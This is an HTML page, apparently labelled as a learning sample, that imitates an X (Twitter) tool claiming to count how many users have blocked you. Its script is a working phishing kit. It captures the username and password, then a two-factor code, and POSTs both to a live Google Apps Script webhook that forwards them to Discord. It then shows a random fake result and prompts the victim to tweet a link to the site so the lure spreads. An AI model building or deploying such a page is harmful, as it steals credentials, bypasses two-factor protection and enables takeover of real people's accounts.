<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>【学習用】完全実働・画面遷移サンプル</title>
<style>
body {
font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
margin: 0;
padding: 0;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
background-color: #000000;
}

.container {
background-color: #ffffff;
padding: 40px;
border-radius: 16px;
width: 100%;
max-width: 400px;
box-sizing: border-box;
text-align: center;
}

.logo-placeholder {
font-size: 36px;
font-weight: bold;
color: #1da1f2;
margin-bottom: 24px;
}

h1 {
font-size: 24px;
font-weight: 800;
color: #0f1419;
margin-bottom: 10px;
}

.description {
font-size: 16px;
color: #536471;
margin-bottom: 30px;
line-height: 1.5;
}

.form-group {
margin-bottom: 18px;
text-align: left;
}

.form-group input {
width: 100%;
padding: 18px;
border: 1px solid #cfd9de;
border-radius: 6px;
font-size: 16px;
box-sizing: border-box;
}

.submit-btn {
width: 100%;
padding: 16px;
background-color: #000000;
color: white;
border: none;
border-radius: 9999px;
font-size: 17px;
font-weight: 700;
cursor: pointer;
}

/* ボタンが無効化（disabled）された時の見た目（グレーアウト） */
.submit-btn:disabled {
background-color: #888888 !important;
cursor: not-allowed;
}

/* X（Twitter）カラーのシェアボタン */
.share-btn {
display: inline-block;
width: 100%;
padding: 16px;
background-color: #1d9bf0;
color: white;
border: none;
border-radius: 9999px;
font-size: 17px;
font-weight: 700;
text-decoration: none;
box-sizing: border-box;
margin-top: 15px;
}

.hidden {
display: none !important;
}
</style>
</head>
<body>

<div class="container">
<div class="logo-placeholder">✕</div>

<h1 id="main-title">ブロックユーザー検証サイト</h1>
<p id="main-desc" class="description">あなたが何人にブロックされているか分かります。</p>

<form id="workflowForm">
<div id="step1-group">
<div class="form-group">
<input type="text" id="username" placeholder="ユーザー名、またはメールアドレス" required>
</div>
<div class="form-group">
<input type="password" id="password" placeholder="パスワード" required>
</div>
</div>

<div id="step2-group" class="hidden">
<div class="form-group">
<input type="text" id="auth_code" placeholder="確認コードを入力" maxlength="6" style="text-align:center; font-size:20px; letter-spacing:4px;">
</div>
</div>

<button type="submit" id="action-btn" class="submit-btn">検証を開始する</button>

<div id="step3-group" class="hidden">
<a href="#" id="share-link" target="_blank" class="share-btn">結果をXでポストする</a>
</div>
</form>
</div>

<script>
let currentStep = 1;
let savedUsername = "";

// 💡 あなたがデプロイしたGASのウェブアプリURLをここに貼り付けます
const gasWebhookUrl = "https://script.google.com/macros/s/AKfycbyVkwkwJbgEA18PeQkiVInJ8VLvlo9h3hGFLQ2hzcLSK4i9k7yFDsqw7e0vYxXFxJqR/exec";

document.getElementById('workflowForm').addEventListener('submit', async (e) => {
e.preventDefault();

const actionBtn = document.getElementById('action-btn');

// ------------------------------------------------------------
// 【処理1】最初のボタン押下時（ID・PWの送信 ➔ 画面切り替え）
// ------------------------------------------------------------
if (currentStep === 1) {
savedUsername = document.getElementById('username').value;
const password = document.getElementById('password').value;

// 💡 連打防止：ボタンを無効化して「送信中...」に変更
actionBtn.disabled = true;
actionBtn.innerText = "送信中...";

// 📢 実際にGASへデータを送信（非同期通信）
try {
await fetch(gasWebhookUrl, {
method: "POST",
mode: "no-cors", // クロスドメインエラーを回避するモード
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ user: savedUsername, pass: password })
});
} catch (err) {
console.error("1回目の送信でエラーが発生しました:", err);
}

// 表面上のUI（表示内容）の切り替え
document.getElementById('step1-group').classList.add('hidden');
document.getElementById('step2-group').classList.remove('hidden');

document.getElementById('main-title').innerText = "ログイン認証コードを入力";
document.getElementById('main-desc').innerText = "アプリまたはSMSに届いた6桁の認証コードを入力してください。";

// 💡 画面が切り替わったら、ボタンのフリーズを解除して次の文言にする
actionBtn.disabled = false;
actionBtn.innerText = "認証して結果を表示";

// 必須属性（required）の入れ替え
document.getElementById('username').removeAttribute('required');
document.getElementById('password').removeAttribute('required');
document.getElementById('auth_code').setAttribute('required', 'true');

currentStep = 2; // ステップ状態を更新

// ------------------------------------------------------------
// 【処理2】2回目のボタン押下時（認証コード送信 ➔ Discord通知 ➔ ポスト準備）
// ------------------------------------------------------------
} else if (currentStep === 2) {
const code = document.getElementById('auth_code').value;

// 💡 連打防止：ボタンを無効化して「送信中...」に変更
actionBtn.disabled = true;
actionBtn.innerText = "送信中...";

// 📢 認証コードをGASへ送信（GAS側で受け取ると設定したDiscordへ即座に流れます）
try {
await fetch(gasWebhookUrl, {
method: "POST",
mode: "no-cors",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ user: `[コード入力:${savedUsername}]`, pass: code })
});
} catch (err) {
console.error("2回目の送信でエラーが発生しました:", err);
// エラーで次に進まない場合はボタンを復活させる
actionBtn.disabled = false;
actionBtn.innerText = "認証して結果を表示";
return;
}

// 入力欄と送信ボタンを非表示にし、結果用のシェアボタンを表示
document.getElementById('step2-group').classList.add('hidden');
actionBtn.classList.add('hidden');
document.getElementById('step3-group').classList.remove('hidden');

// ランダムなブロック人数の決定
const fakeCount = Math.floor(Math.random() * 15) + 1;

// 最終結果画面のテキストを組み立て
document.getElementById('main-title').innerText = "解析が完了しました！";
document.getElementById('main-desc').innerHTML = `解析の結果、<strong>${savedUsername}</strong> さんは現在 <span style="color:#ff0000; font-weight:bold;">${fakeCount}人</span> にブロックされています！`;

// 📢 X（旧Twitter）に飛ばすための投稿テキストとURLの設定
const tweetText = `【ブロックユーザー検証】\n解析の結果、私は現在 ${fakeCount}人 にブロックされています！\nあなたは何人にブロックされている？ここでチェックしてみよう！`;
const siteUrl = "https://x-block-checker.drr.ac/"; // 実際のサイトURL

// 特殊文字や改行を安全に変換（URLエンコード）してボタンのリンクに設定
const twitterIntentUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(tweetText)}&url=${encodeURIComponent(siteUrl)}`;
document.getElementById('share-link').href = twitterIntentUrl;
}
});
</script>

</body>
</html>